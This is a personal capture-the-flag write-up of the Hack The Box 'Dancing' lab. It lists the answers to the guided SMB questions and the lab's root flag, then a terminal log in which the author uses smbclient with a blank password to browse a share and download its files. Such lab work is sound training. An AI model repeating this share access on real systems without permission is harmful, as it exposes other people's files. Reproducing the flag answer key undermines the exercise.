
#### What does the 3-letter acronym SMB stand for?
Server Message Block

#### What port does SMB use to operate at?
445

#### What is the service name for port 445 that came up in our Nmap scan?
microsoft-ds

#### What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?
-L

#### How many shares are there on Dancing?
4

#### What is the name of the share we are able to access in the end with a blank password?
WorkShares

#### What is the command we can use within the SMB shell to download the files we find?
get

#### Submit root flag
5f61c10dffbc77a704d76016a22f1664

``` bash 
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Dancing]
└──╼ $smbclient \\\\10.129.196.63\\WorkShares
Password for [WORKGROUP\ramdark]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 02:22:01 2021
  ..                                  D        0  Mon Mar 29 02:22:01 2021
  Amy.J                               D        0  Mon Mar 29 03:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1732249 blocks available
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 03:08:24 2021
  ..                                  D        0  Mon Mar 29 03:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 05:00:37 2021

		5114111 blocks of size 4096. 1732006 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \Amy.J\> cd..
cd..: command not found
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 03:08:24 2021
  ..                                  D        0  Mon Mar 29 03:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 05:00:37 2021

		5114111 blocks of size 4096. 1731998 blocks available
smb: \Amy.J\> cd ..
smb: \> ls
  .                                   D        0  Mon Mar 29 02:22:01 2021
  ..                                  D        0  Mon Mar 29 02:22:01 2021
  Amy.J                               D        0  Mon Mar 29 03:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1731998 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 03:26:57 2021

		5114111 blocks of size 4096. 1732078 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \James.P\> close
close <fnum>
smb: \James.P\> cd ..
smb: \> close
close <fnum>
smb: \> exit
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Dancing]
└──╼ $
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Dancing]
└──╼ $ls
Dancing.md  document.pdf  flag.txt  worknotes.txt
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Dancing]
└──╼ $cat worknotes.txt 
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing ┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Dancing]
└──╼ $cat flag.txt 
5f61c10dffbc77a704d76016a22f1664
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Dancing]
└──╼ $


```
